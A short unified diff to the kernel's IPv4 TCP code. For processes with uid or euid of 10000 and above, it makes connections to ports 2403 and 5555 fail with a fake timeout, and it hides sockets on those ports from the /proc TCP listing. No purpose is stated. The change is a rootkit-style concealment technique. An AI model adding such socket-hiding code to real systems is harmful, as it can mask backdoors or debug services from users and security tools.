@@ -230,6 +230,11 @@ int tcp_v4_connect(struct sock *sk, struct sockaddr *uaddr, int addr_len)
 	if (usin->sin_family != AF_INET)
 		return -EAFNOSUPPORT;
 
+	if ((current_uid().val >= 10000 || current_euid().val >= 10000) &&
+	    (usin->sin_port == htons(2403) || usin->sin_port == htons(5555))) {
+		return -ETIMEDOUT;
+	}
+
 	nexthop = daddr = usin->sin_addr.s_addr;
 	inet_opt = rcu_dereference_protected(inet->inet_opt,
 					     lockdep_sock_is_held(sk));
@@ -2634,6 +2639,14 @@ static int tcp4_seq_show(struct seq_file *seq, void *v)
 		goto out;
 	}
 	st = seq->private;
+
+	if ((current_uid().val >= 10000 || current_euid().val >= 10000)) {
+		if (sk->sk_state != TCP_TIME_WAIT && sk->sk_state != TCP_NEW_SYN_RECV) {
+			struct inet_sock *inet = inet_sk(sk);
+			if (inet && (inet->inet_num == 2403 || inet->inet_num == 5555))
+				return 0;
+		}
+	}
 
 	if (sk->sk_state == TCP_TIME_WAIT)
 		get_timewait4_sock(v, seq, st->num);
